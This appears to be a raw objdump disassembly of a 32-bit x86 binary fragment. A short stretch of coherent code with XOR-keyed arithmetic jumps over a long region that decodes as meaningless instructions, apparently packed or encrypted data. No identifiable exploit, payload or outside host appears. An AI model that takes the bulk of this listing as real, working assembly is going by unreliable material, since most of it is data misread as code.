  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x4344b7,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x4344bb,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	les    ebx,FWORD PTR [ecx-0x3e]
  409318:	pop    ebx
  409319:	xchg   edx,eax
  40931a:	loop   0x40939a
  40931c:	jle    0x40938e
  40931e:	jns    0x40939e
  409320:	jle    0x409334
  409322:	or     bh,dl
  409324:	popa   
  409325:	pop    edi
  409326:	xor    edx,DWORD PTR [eax-0x60]
  409329:	mov    ah,0x65
  40932b:	mov    ecx,0x268eb061
  409330:	pop    esi
  409331:	dec    ecx
  409332:	sub    eax,0x30eb2202
  409337:	pop    ebp
  409338:	in     al,dx
  409339:	mov    bh,0x98
  40933b:	xlat   BYTE PTR ds:[ebx]
  40933c:	dec    esp
  40933d:	fstp   QWORD PTR [ebx+0x55]
  409340:	or     ah,ch
  409342:	mov    eax,ds:0xd722ef8a
  409347:	inc    ecx
  409348:	mov    ch,BYTE PTR [ebp+0x4a]
  40934b:	in     al,dx
  40934c:	push   ebp
  40934d:	loope  0x40935f
  40934f:	mov    ebp,0x157ccfa0
  409354:	jl     0x409314
  409356:	mov    edx,0x70d2c05f
  40935b:	jp     0x4092ec
  40935d:	xchg   edi,eax
  40935e:	adc    BYTE PTR [eax+0x633a563],bl
  409364:	mov    ah,0x2d
  409366:	ss (bad) 
  409368:	out    dx,eax
  409369:	loopne 0x409352
  40936b:	push   esi
  40936c:	fcom   QWORD PTR [ecx+0x21]
  40936f:	mov    ds:0x68a55b82,al
  409374:	jns    0x40930b
  409376:	(bad)  
  409377:	sub    BYTE PTR [ebx],bl
  409379:	jno    0x4093f2
  40937b:	fidivr DWORD PTR [edx+edi*8+0x54f84123]
  409382:	jnp    0x409331
  409384:	jmp    0x9cba:0x627e261e
  40938b:	int    0x94
  40938d:	cmp    dh,BYTE PTR [edx]
  40938f:	cmp    bh,BYTE PTR [ebx]
  409391:	inc    ebx
  409392:	ret    
  409393:	mov    ch,0x89
  409395:	test   eax,0x5944823d
  40939a:	mov    eax,ds:0x1ac14933
  40939f:	sbb    ch,BYTE PTR [edx-0x5a2c50c4]
  4093a5:	mov    ds:0xbd1284ff,al
  4093aa:	jl     0x4093a7
  4093ac:	in     eax,0x39
  4093ae:	ret    
  4093af:	mov    esi,0x7b7cd3db
  4093b4:	fs inc ecx
  4093b6:	ret    
  4093b7:	sbb    eax,0x47fd5cb8
  4093bc:	arpl   bx,di
  4093be:	jmp    0xdca3:0x6e6b25ac
  4093c5:	jnp    0x4093c1
  4093c7:	or     edi,ecx
  4093c9:	xor    BYTE PTR [esi-0x56a9b315],bl
  4093cf:	das    
  4093d0:	cwde   
  4093d1:	mov    dl,0x6b
  4093d3:	pop    es
  4093d4:	xchg   bl,dh
  4093d6:	push   es
  4093d7:	mov    DWORD PTR [eax+0x4b],ebp
  4093da:	inc    esi
  4093db:	ret    
  4093dc:	or     eax,0x9c8ca97f
  4093e1:	sub    al,0xbe
  4093e3:	mov    edi,0x4260478a
  4093e8:	mov    cl,BYTE PTR [eax-0x2c]
  4093eb:	xor    BYTE PTR [edx-0x56],bl
  4093ee:	je     0x4093e3
  4093f0:	icebp  
  4093f1:	mov    eax,ds:0x921065f4
  4093f6:	retf   0xf124
  4093f9:	icebp  
  4093fa:	mov    eax,ds:0xfd854529
  4093ff:	mov    ebp,ecx
  409401:	in     al,0xb
  409403:	jo     0x409445
  409405:	sbb    DWORD PTR [ecx-0x1165e07f],0xa00c1262
  40940f:	pusha  
  409410:	call   0x6e7f58f
  409415:	mov    cl,BYTE PTR [ecx+ecx*4+0x1d]
  409419:	bound  ebx,QWORD PTR ds:0xe4adc9fc
  40941f:	cs daa 
  409421:	lahf   
  409422:	fbld   TBYTE PTR [esi+0xf7745ee]
  409428:	sub    al,0x32
  40942a:	popf   
  40942b:	rcl    DWORD PTR [edi+0x7c],0x87
  40942f:	sbb    al,0xc6
  409431:	add    esp,edi
  409433:	adc    BYTE PTR [ebp+edx*1-0x48],bl
  409437:	xchg   bh,ah
  409439:	int    0x4a
  40943b:	imul   edx,DWORD PTR [ebx-0x2fb6acac],0xffffffff
  409442:	mov    ebp,DWORD PTR [eax]
  409444:	loope  0x4094a1
  409446:	inc    esp
  409447:	pop    ebp
  409448:	or     DWORD PTR [ebp-0x70],eax
  40944b:	inc    esp
  40944c:	ffree  st(3)
  40944e:	call   0x45b91f62
  409453:	sbb    DWORD PTR [ecx-0x2256ac0],esp
  409459:	(bad)  
  40945b:	or     ebp,edi
  40945d:	add    dh,BYTE PTR [edi+0x1409423a]
  409463:	sub    cl,dh
  409465:	mov    bl,0x1a
  409467:	push   0xd36116f1
  40946c:	int    0x78
  40946e:	fxam   
  409470:	jg     0x4094b5
  409472:	(bad)  
  409473:	retf   
  409474:	ins    BYTE PTR es:[edi],dx
  409475:	inc    edx
  409476:	enter  0x943d,0xff
  40947a:	jns    0x40946a
  40947c:	iret   
  40947d:	sbb    DWORD PTR [eax+0x7b25045f],esp
  409483:	and    DWORD PTR [ecx+0x6b80b63c],ebp
  409489:	mov    ebp,ss
  40948b:	sbb    al,BYTE PTR [edx+0x48]
  40948e:	addr16 pop esi
  409490:	das    
  409491:	int3   
  409492:	in     al,dx
  409493:	push   0x92c24b76
  409498:	jl     0x4094ee
  40949a:	sbb    BYTE PTR cs:[edi],bl
  40949d:	push   ecx
  40949e:	ss sahf 
  4094a0:	mov    dl,0x49
  4094a2:	pop    ebx
  4094a3:	ins    BYTE PTR es:[edi],dx
  4094a4:	add    eax,0xa263bf92
  4094a9:	cld    
  4094aa:	sub    dl,ah
  4094ac:	xor    al,0x3d
  4094ae:	sti    
  4094af:	out    dx,al
  4094b0:	aad    0x39
  4094b2:	aaa    
  4094b3:	fdiv   st(3),st
  4094b5:	loopne 0x4094cc
  4094b7:	push   edx
  4094b8:	ret    
  4094b9:	mov    dl,0x8b
  4094bb:	jbe    0x409469
  4094bd:	inc    edx
  4094be:	out    dx,al
  4094bf:	repnz daa 
  4094c1:	mov    ch,BYTE PTR [ebx+0x13]
  4094c4:	push   ebx
  4094c5:	test   eax,0xaf38716c
  4094ca:	jno    0x4094a1
  4094cc:	scas   al,BYTE PTR es:[edi]
  4094cd:	ins    DWORD PTR es:[edi],dx
  4094ce:	or     esi,DWORD PTR [esi]
  4094d0:	rcr    ecx,1
  4094d2:	adc    ecx,DWORD PTR [ebx]
  4094d4:	jno    0x409484
  4094d6:	dec    esp
  4094d7:	adc    DWORD PTR [ecx+0x11a93619],esi
  4094dd:	loope  0x409507
  4094df:	gs das 
  4094e1:	shl    ebx,1
  4094e3:	out    dx,al
  4094e4:	ja     0x4094d2
  4094e6:	cli    
  4094e7:	mov    edx,0x59185ca5
  4094ec:	fxch   st(4)
  4094ee:	cmp    DWORD PTR [ebx+ebx*4-0x2d],eax
  4094f2:	push   edi
  4094f3:	lea    edx,[ecx-0x50dd6525]
  4094f9:	cmc    
  4094fa:	dec    eax
  4094fb:	icebp  
  4094fc:	pop    ebx
  4094fd:	mov    cl,0x79
  4094ff:	adc    dh,BYTE PTR [edx+0x280ccafa]
  409505:	dec    esi
  409506:	pop    es
  409507:	cmp    BYTE PTR [ecx+eiz*1],bh
  40950a:	lea    esi,[edx+ebx*2+0x18]
  40950e:	sub    esp,DWORD PTR [ecx+0x34]
  409511:	test   DWORD PTR [edi],ebx
  409513:	call   DWORD PTR [ebp+ebx*8-0x38fb191b]
  40951a:	dec    ebx
  40951b:	outs   dx,DWORD PTR ds:[esi]
  40951c:	mov    al,ds:0x1233291e
  409521:	mov    WORD PTR [ecx],es
  409523:	fs push 0xdeb67b8d
  409529:	and    ecx,DWORD PTR [edi]
  40952b:	cmp    al,0xd5
  40952d:	out    dx,eax
  40952e:	mov    esi,0x5090a925
  409533:	enter  0xee6c,0x6c
  409537:	(bad)  
  409538:	sub    cl,dl
  40953a:	push   eax
  40953b:	call   0x38df:0xe216114e
  409542:	mov    ch,0x33
  409545:	push   ebx
  409546:	push   esp
  409547:	repnz cli 
  409549:	mov    ecx,0x879b8077
  40954e:	xchg   ecx,eax
  40954f:	push   esp
  409550:	addr16 xchg ebx,eax
  409552:	test   DWORD PTR [ebp-0x75319a03],ebp
  409558:	mov    ecx,0x98a3f993
  40955d:	jecxz  0x4095bd
  40955f:	sahf   
  409560:	adc    eax,0xfdd1ef69
  409565:	daa    
  409566:	ins    BYTE PTR es:[edi],dx
  409567:	stos   DWORD PTR es:[edi],eax
  409568:	xchg   edi,eax
  409569:	call   0x3a70:0x46063c4a
  409570:	mov    ah,0x9a
  409572:	(bad)  
  409573:	into   
  409574:	fisub  WORD PTR [eax]
  409576:	xor    eax,0xceb5b9c2
  40957b:	adc    ebp,DWORD PTR fs:[esi-0x7dfdba4d]
  409582:	out    dx,eax
  409583:	dec    edi
  409584:	xchg   BYTE PTR [ebp+0x63],bh
  409587:	addr16 repz enter 0x17f3,0x91
  40958d:	addr16 into 
  40958f:	add    DWORD PTR [ebp-0x4e],eax
  409592:	and    esi,eax
  409594:	test   cl,0x1a
  409597:	bnd jl 0x409536
  40959a:	xchg   ecx,eax
  40959b:	cmp    eax,0x3aa9455d
  4095a0:	jb     0x4095ff
  4095a2:	xor    eax,0x1e64d043
  4095a7:	push   esi
  4095a8:	iret   
  4095a9:	or     al,0xa6
  4095ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095ac:	cmp    BYTE PTR [edi-0x8],dh
  4095af:	or     BYTE PTR [bp+di-0x1b08],bh
  4095b4:	and    eax,0xac73fc4f
  4095b9:	cmp    DWORD PTR [ebp-0x77],0x50b5e375
  4095c0:	mov    ds:0x9a0ffbf7,al
  4095c5:	ins    DWORD PTR es:[edi],dx
  4095c6:	ins    DWORD PTR es:[edi],dx
  4095c7:	ret    
  4095c8:	ja     0x409619
  4095ca:	cs push edx
  4095cc:	fmul   QWORD PTR [edx-0x4b]
  4095cf:	sub    BYTE PTR [ecx],al
  4095d1:	call   FWORD PTR [ebx+0x29]
  4095d4:	sbb    dh,BYTE PTR [ecx-0x10]
  4095d7:	imul   edi,ecx,0xa
  4095da:	lock cs into 
  4095dd:	fiadd  WORD PTR [edi]
  4095df:	mov    DWORD PTR [ebx+0x4d],eax
  4095e2:	mov    eax,ds:0x314f4c97
  4095e7:	ss cld 
  4095e9:	imul   BYTE PTR [ebp-0xc]
  4095ec:	repnz enter 0x53b0,0x63
  4095f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095f2:	sub    esi,DWORD PTR [edi-0x64f26860]
  4095f8:	push   0xffffffbe
  4095fa:	mov    eax,0xf7af992
  4095ff:	int3   
  409600:	lods   al,BYTE PTR ds:[esi]
  409601:	sub    BYTE PTR [ebp+eax*4+0x20f4fa17],0x3d
  409609:	mov    dl,0xef
  40960b:	shr    ecx,0x77
  40960e:	pop    ecx
  40960f:	mov    BYTE PTR [esp+edi*2-0x8477206],cl
  409616:	jmp    0x2ff7bde9
  40961b:	or     al,BYTE PTR [eax-0x2aba0413]
  409621:	inc    ebx
  409622:	dec    esp
  409623:	fadd   st,st(2)
  409625:	cmp    BYTE PTR [ecx+esi*1+0x3e8c76b5],bl
  40962c:	imul   edi,DWORD PTR [esi],0x42
  40962f:	push   0x983f1267
  409634:	into   
  409635:	enter  0x332e,0xfb
  409639:	push   eax
  40963a:	add    ah,BYTE PTR [ebp+0x452d4997]
  409640:	fsubrp st(7),st
  409642:	rcl    BYTE PTR [esi],cl
  409644:	xchg   esp,eax
  409645:	pop    ss
  409646:	out    0xb,eax
  409648:	push   ebp
  409649:	aam    0xc3
  40964b:	and    DWORD PTR [eax],esi
  40964d:	or     eax,0x710633d2
  409652:	mov    dh,0x81
  409654:	inc    ecx
  409655:	imul   esp,DWORD PTR [edx],0x5f59999f
  40965b:	mov    ah,0x80
  40965d:	or     BYTE PTR [ebx],ah
  40965f:	(bad)  
  409660:	aad    0x1d
  409662:	xlat   BYTE PTR ds:[ebx]
  409663:	idiv   DWORD PTR [ecx+ecx*1-0x79b85942]
  40966a:	aas    
  40966b:	xchg   ebp,eax
  40966c:	ja     0x4095fa
  40966e:	push   edx
  40966f:	adc    esi,esp
  409671:	xchg   ebx,eax
  409672:	nop
  409673:	push   ss
  409674:	addr16 and esi,ebx
  409677:	jne    0x40961d
  409679:	xor    dh,ah
  40967b:	jno    0x4096f8
  40967d:	pop    edi
  40967e:	pop    esi
  40967f:	scas   al,BYTE PTR es:[edi]
  409680:	dec    eax
  409681:	mov    ah,0x37
  409683:	clc    
  409684:	xor    BYTE PTR [eax-0x39062d9],dl
  40968a:	xor    eax,0xe426b5c5
  40968f:	inc    edx
  409690:	mov    edx,0x5e7d2e86
  409695:	scas   al,BYTE PTR es:[edi]
  409696:	sar    ebp,cl
  409698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409699:	neg    DWORD PTR [edx+0x2b8808db]
  40969f:	(bad)  
  4096a0:	(bad)  
  4096a1:	clc    
  4096a2:	mov    ebp,0xe0b92672
  4096a7:	push   ds
  4096a8:	xor    DWORD PTR [esi],esp
  4096aa:	xor    ecx,DWORD PTR [esi]
  4096ac:	iret   
  4096ad:	cs dec edi
  4096af:	fcom   QWORD PTR [edx+ebp*8]
  4096b2:	dec    ecx
  4096b3:	rcl    BYTE PTR [ecx],0x6a
  4096b6:	loop   0x409678
  4096b8:	xchg   DWORD PTR [eax],ebp
  4096ba:	int    0xba
  4096bc:	cmp    ecx,DWORD PTR [eax]
  4096be:	lock sub esp,DWORD PTR [ecx+edi*2+0x4d]
  4096c3:	xchg   ecx,eax
  4096c4:	ja     0x4096c4
  4096c6:	sbb    eax,DWORD PTR [eax-0x621369af]
  4096cc:	std    
  4096cd:	mov    esp,0x56bd387c
  4096d2:	xor    al,0xf2
  4096d4:	add    al,BYTE PTR [ecx+0x6c716846]
  4096da:	mov    ecx,0xf14fd8b1
  4096df:	sahf   
  4096e0:	fbstp  TBYTE PTR [eax]
  4096e2:	daa    
  4096e3:	pop    esi
  4096e4:	jg     0x4096e0
  4096e6:	adc    BYTE PTR ds:0x52053bed,bh
  4096ec:	mov    ecx,DWORD PTR [esi-0x12]
  4096ef:	int    0x11
  4096f1:	sbb    BYTE PTR [ebp-0x39db8ef6],bl
  4096f7:	jno    0x409722
  4096f9:	or     al,0xca
  4096fb:	mov    al,0xb6
  4096fd:	lahf   
  4096fe:	retf   0x6f76
  409701:	pop    esi
  409702:	jecxz  0x409704
  409704:	mov    WORD PTR [ecx-0x74],ss
  409707:	call   0x7ce3:0xf64ac2ab
  40970e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40970f:	pop    eax
  409710:	inc    esp
  409711:	out    0x93,al
  409713:	add    cl,BYTE PTR [edx+0x3878c833]
  409719:	push   esi
  40971a:	out    0x8b,al
  40971c:	inc    ebp
  40971d:	or     BYTE PTR [ebx+0x43458f3d],cl
  409723:	add    BYTE PTR [ecx],cl
  409725:	cmp    eax,0x434593
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x434473
  409745:	add    ecx,DWORD PTR ds:0x4344b7
  40974b:	mov    DWORD PTR ds:0x434473,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	out    0x40,eax
  409767:	mov    edi,0x7eee94b3
  40976c:	jle    0x4097de
  40976e:	jns    0x4097ee
  409770:	jle    0x40972b
  409772:	adc    eax,0x8e5f3d6
  409777:	mov    edi,0x1dbc4593
  40977c:	inc    ebp
  40977d:	cmc    
  40977e:	dec    esi
  40977f:	mov    bl,0xb8
  409781:	lea    eax,[esi]
  409783:	sbb    dh,BYTE PTR [ebx-0x6315f6ee]
  409789:	nop
  40978a:	(bad)  
  40978b:	jle    0x4097fe
  40978d:	or     al,BYTE PTR [esi+0x25]
  409790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409791:	fsubr  st,st(2)
  409793:	loop   0x409772
  409795:	pusha  
  409796:	add    eax,0x301a8476
  40979b:	fst    QWORD PTR [eax]
  40979d:	out    0x8d,eax
  40979f:	pushf  
  4097a0:	ins    BYTE PTR es:[edi],dx
  4097a1:	(bad)  
  4097a2:	(bad)  
  4097a3:	retf   
  4097a4:	mov    esi,0x26730c06
  4097a9:	fs test esp,0x811a8259
  4097b0:	nop
  4097b1:	loope  0x4097a7
  4097b3:	mov    ebp,0x56769595
  4097b8:	add    al,BYTE PTR [ebx]
  4097ba:	xchg   ecx,eax
  4097bb:	mov    eax,ds:0x8d7791ee
  4097c0:	and    edx,edi
  4097c2:	xor    edx,esp
  4097c4:	jno    0x40979e
  4097c6:	add    ebp,DWORD PTR [ecx+esi*8+0x6f]
  4097ca:	sub    eax,0x41abd29e
  4097cf:	cwde   
  4097d0:	shl    esp,cl
  4097d2:	mov    ebp,esi
  4097d4:	mov    esp,ebx
  4097d6:	(bad)  
  4097d8:	sub    DWORD PTR [edx],ebp
  4097da:	cld    
  4097db:	cmp    al,0xd1
  4097dd:	cmp    dl,BYTE PTR [ecx-0x49]
  4097e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097e1:	daa    
  4097e2:	outs   dx,DWORD PTR ds:[esi]
  4097e3:	jmp    0x36b6aed9
  4097e8:	adc    eax,0x2fb1ed52
  4097ed:	and    ecx,edx
  4097ef:	test   DWORD PTR [edi+0x27dc11d1],esi
  4097f5:	xor    ch,BYTE PTR [ecx-0x237c046f]
  4097fb:	mov    dh,0x61
  4097fd:	arpl   bp,sp
  4097ff:	test   BYTE PTR [edi+0x2],ah
  409802:	imul   ebp,DWORD PTR [esi+ebp*2+0x46],0x616aed89
  40980a:	xor    edi,DWORD PTR [eax-0x55]
  40980d:	inc    esi
  40980f:	add    DWORD PTR [eax-0x1cff012d],0x73
  409816:	aaa    
  409817:	leave  
  409818:	mov    edi,0xa0a5abc4
  40981d:	in     eax,0x32
  40981f:	jno    0x4097fa
  409821:	xor    edi,DWORD PTR ds:0x2c85c012
  409827:	mov    bl,BYTE PTR [eax-0x7b551a96]
  40982d:	repnz or al,BYTE PTR [ebx+0x16]
  409831:	push   ss
  409832:	in     eax,0x83
  409834:	repz or al,0x86
  409837:	icebp  
  409838:	frstor [edx+0x51cb3488]
  40983e:	jnp    0x40989a
  409840:	dec    ebp
  409841:	jb     0x40983e
  409843:	pop    esi
  409844:	sbb    DWORD PTR [eax-0x3a],edx
  409847:	repz pushf 
  409849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40984a:	lods   eax,DWORD PTR ds:[esi]
  40984b:	pop    edi
  40984c:	arpl   WORD PTR [eax-0x33],bx
  40984f:	mov    esp,0xc38ef6ea
  409854:	lods   al,BYTE PTR ds:[esi]
  409855:	jmp    0x461d:0xbf84975b
  40985c:	dec    ebp
  40985d:	cmp    ecx,esi
  40985f:	lods   eax,DWORD PTR ds:[esi]
  409860:	das    
  409861:	push   ebp
  409862:	hlt    
  409863:	push   cs
  409864:	arpl   WORD PTR [eax+0x63],bx
  409867:	std    
  409868:	mov    ds:0xaf84d505,al
  40986d:	(bad)  
  40986e:	pushf  
  40986f:	or     DWORD PTR [edi],edi
  409871:	mov    bl,0xc0
  409873:	lods   eax,DWORD PTR ds:[esi]
  409874:	inc    ebx
  409875:	(bad)  
  409876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409877:	adc    eax,0xa2e5739b
  40987c:	sbb    BYTE PTR [eax+eiz*1+0x614925bd],ah
  409883:	jmp    0x40983c
  409885:	(bad)  
  409886:	sub    eax,DWORD PTR [ecx-0x59cc5564]
  40988c:	pop    edx
  40988d:	rcl    BYTE PTR ss:[edi-0x645bff23],cl
  409894:	sub    al,0xa4
  409896:	fs (bad) 
  409898:	push   edx
  409899:	push   esi
  40989a:	xor    BYTE PTR [edi-0xc],ah
  40989d:	(bad)  
  40989e:	dec    edi
  40989f:	clc    
  4098a0:	mov    ecx,0x761fd7ac
  4098a5:	pop    es
  4098a6:	jns    0x4098bf
  4098a8:	test   BYTE PTR [edx+edi*8-0x4a205427],ch
  4098af:	test   DWORD PTR [ebp+0x4e],eax
  4098b2:	jno    0x409865
  4098b4:	fild   DWORD PTR [esi+0xb]
  4098b7:	and    al,BYTE PTR [edi-0x373752f2]
  4098bd:	mov    edx,0x6665256c
  4098c2:	mov    esi,0x1b9f6a2c
  4098c7:	fwait
  4098c8:	dec    esp
  4098c9:	jnp    0x4098b8
  4098cb:	add    al,0xad
  4098cd:	push   ss
  4098ce:	mov    dh,0x4
  4098d0:	loop   0x4098b8
  4098d2:	dec    eax
  4098d3:	jge    0x409908
  4098d5:	pop    ebp
  4098d6:	add    BYTE PTR ds:0xa6732b10,0x53
  4098dd:	adc    eax,DWORD PTR [ebx]
  4098df:	xchg   esi,eax
  4098e0:	xlat   BYTE PTR ds:[ebx]
  4098e1:	scas   al,BYTE PTR es:[edi]
  4098e2:	not    DWORD PTR [ecx+ebx*4]
  4098e5:	rcr    BYTE PTR [ecx+0xd],cl
  4098e8:	scas   al,BYTE PTR es:[edi]
  4098e9:	inc    ebp
  4098ea:	jge    0x4098d3
  4098ec:	adc    DWORD PTR [ebx],edx
  4098ee:	rol    BYTE PTR [ecx+0x36],0xa4
  4098f2:	repnz xor DWORD PTR [edx-0x3d],edi
  4098f6:	adc    eax,0x6d8babed
  4098fb:	pop    ebp
  4098fc:	mov    eax,ds:0xaed8f688
  409901:	inc    esi
  409902:	adc    dh,ah
  409904:	test   DWORD PTR [ebx],eax
  409906:	cmp    BYTE PTR [esi+0x5a],ah
  409909:	ins    BYTE PTR es:[edi],dx
  40990a:	xor    ebp,DWORD PTR [edi]
  40990c:	mov    dh,0xf6
  40990e:	mov    ds:0x1fa89111,eax
  409913:	mov    ebp,0x6f1e75f9
  409918:	ror    BYTE PTR [esi+0x9],1
  40991b:	pop    ss
  40991c:	hlt    
  40991d:	retf   
  40991e:	mov    cl,0xe1
  409920:	cmp    BYTE PTR [edi+0x5143dc52],dl
  409926:	stos   BYTE PTR es:[edi],al
  409927:	dec    esp
  409928:	popa   
  409929:	mov    bl,0xd3
  40992b:	mov    ds:0xeaa788a5,al
  409930:	cmp    eax,0x5f99b4a4
  409935:	jle    0x40993e
  409937:	and    DWORD PTR [ebp-0x69],esi
  40993a:	nop
  40993b:	inc    esi
  40993c:	loop   0x4098eb
  40993e:	pop    ss
  40993f:	dec    edi
  409940:	loop   0x4098fc
  409942:	clc    
  409943:	mov    dh,0xd
  409945:	in     al,0x3e
  409947:	out    0xde,eax
  409949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40994a:	enter  0xa587,0x47
  40994e:	out    0xb1,al
  409950:	fild   DWORD PTR [esi]
  409952:	or     ch,BYTE PTR [ecx+esi*8]
  409955:	sub    cl,BYTE PTR [eax-0x2c15beb]
  40995b:	sbb    al,0xad
  40995d:	pop    eax
  40995e:	in     al,0x74
  409960:	test   eax,0xfeb22308
  409965:	icebp  
  409966:	add    ebp,DWORD PTR [ebx+0x7d2caa5a]
  40996c:	sahf   
  40996d:	loopne 0x4099bf
  40996f:	test   eax,0xdb7c2682
  409974:	popa   
  409975:	lea    ecx,[ebx]
  409977:	aaa    
  409978:	jnp    0x4099af
  40997a:	or     eax,DWORD PTR [edx]
  40997c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40997d:	mov    ah,0x5
  40997f:	retf   0x3fcf
  409982:	mov    cl,0xfb
  409984:	mov    ds:0xc956d22a,al
  409989:	mov    edi,0xc350ba1c
  40998e:	xchg   BYTE PTR [ebp-0x21d8e3e9],ah
  409994:	adc    ebp,DWORD PTR [edi-0x2]
  409997:	jmp    eax
  409999:	int3   
  40999a:	adc    eax,ecx
  40999c:	xchg   esi,eax
  40999d:	and    al,0x9e
  40999f:	ds or  eax,0xb6360880
  4099a5:	or     al,0x2a
  4099a7:	aaa    
  4099a8:	mov    esi,0x36ed2904
  4099ad:	imul   esp,DWORD PTR [edi-0x249f0661],0x58
  4099b4:	mov    ds:0xc28c17,al
  4099b9:	push   0x31692cdd
  4099be:	mov    bl,0x48
  4099c0:	data16 aaa 
  4099c2:	shr    DWORD PTR [edx-0x5128dbf3],1
  4099c8:	pop    eax
  4099c9:	mov    ds:0x64dd7907,eax
  4099ce:	adc    al,0xc4
  4099d0:	dec    esp
  4099d1:	cs jo  0x409964
  4099d4:	mov    al,0xa3
  4099d6:	clc    
  4099d7:	sub    edx,eax
  4099d9:	mov    edx,0x6b595c81
  4099de:	mov    ecx,0x90e3ea8
  4099e3:	or     BYTE PTR [eax-0x4],ch
  4099e6:	inc    eax
  4099e7:	add    DWORD PTR [ebx],eax
  4099e9:	lods   eax,DWORD PTR ds:[esi]
  4099ea:	test   al,0xc
  4099ec:	mov    bh,0x25
  4099ee:	rcr    DWORD PTR [ecx-0x7d],1
  4099f1:	adc    BYTE PTR [ebx+0x2f8f93b4],dl
  4099f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099f8:	push   edi
  4099f9:	inc    esp
  4099fa:	mov    esi,esp
  4099fc:	add    esi,DWORD PTR cs:[esi]
  4099ff:	and    al,0xcf
  409a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a02:	icebp  
  409a03:	ss cwde 
  409a05:	mov    eax,ds:0xd0fae8a0
  409a0a:	es mov dl,0x18
  409a0d:	adc    al,0x30
  409a0f:	in     eax,dx
  409a10:	shr    bl,1
  409a12:	or     ch,dh
  409a14:	outs   dx,DWORD PTR ds:[esi]
  409a15:	scas   al,BYTE PTR es:[edi]
  409a16:	push   esp
  409a17:	aam    0x2f
  409a19:	jecxz  0x4099f0
  409a1b:	mov    esp,0xa87d29c2
  409a20:	scas   eax,DWORD PTR es:[edi]
  409a21:	sbb    al,0xaa
  409a23:	in     eax,dx
  409a24:	mov    al,BYTE PTR [ebx-0x80]
  409a27:	ins    BYTE PTR es:[edi],dx
  409a28:	push   ebx
  409a29:	xchg   ecx,eax
  409a2a:	jo     0x409a43
  409a2c:	pop    edx
  409a2d:	adc    BYTE PTR [edx+0x72afaffb],0xca
  409a34:	sti    
  409a35:	aam    0xd8
  409a37:	les    edx,FWORD PTR [ebx]
  409a39:	pushf  
  409a3a:	in     al,0xc3
  409a3c:	xor    BYTE PTR [ebp-0x5cc21372],ch
  409a42:	pop    ds
  409a43:	jmp    0xf7fe9525
  409a48:	leave  
  409a49:	and    eax,0xe959b7fa
  409a4e:	test   BYTE PTR [edi-0x6f],cl
  409a51:	push   0x2ef42e7a
  409a56:	sbb    bh,BYTE PTR [eax+0x711efab9]
  409a5c:	or     al,bh
  409a5e:	cmp    DWORD PTR [ecx+0x48],ebp
  409a61:	in     eax,0x67
  409a63:	pop    ecx
  409a64:	ds sar bh,0xd1
  409a68:	add    al,0x45
  409a6a:	sub    DWORD PTR [eax+ebx*4-0x47],esp
  409a6e:	sbb    dh,BYTE PTR [edx]
  409a70:	aas    
  409a71:	stos   DWORD PTR es:[edi],eax
  409a72:	add    al,0x9b
  409a74:	in     al,dx
  409a75:	(bad)  
  409a76:	lods   eax,DWORD PTR ds:[esi]
  409a77:	dec    esp
  409a78:	loopne 0x409aac
  409a7a:	clc    
  409a7b:	cwde   
  409a7c:	add    al,0x70
  409a7e:	and    al,0x5e
  409a80:	pushf  
  409a81:	arpl   WORD PTR [edi],si
  409a83:	xchg   ecx,eax
  409a84:	inc    esi
  409a85:	push   edi
  409a86:	ins    BYTE PTR es:[edi],dx
  409a87:	mov    DWORD PTR [ecx+0x53],ebp
  409a8a:	fnstenv [ecx]
  409a8c:	cdq    
  409a8d:	aam    0x6
  409a8f:	pushf  
  409a90:	data16 (bad) 
  409a92:	mov    esp,0xd27849d7
  409a97:	mov    WORD PTR [ebx],gs
  409a99:	ss pop edi
  409a9b:	daa    
  409a9c:	fcomp  QWORD PTR [eax-0x18]
  409a9f:	pop    ecx
  409aa0:	out    dx,eax
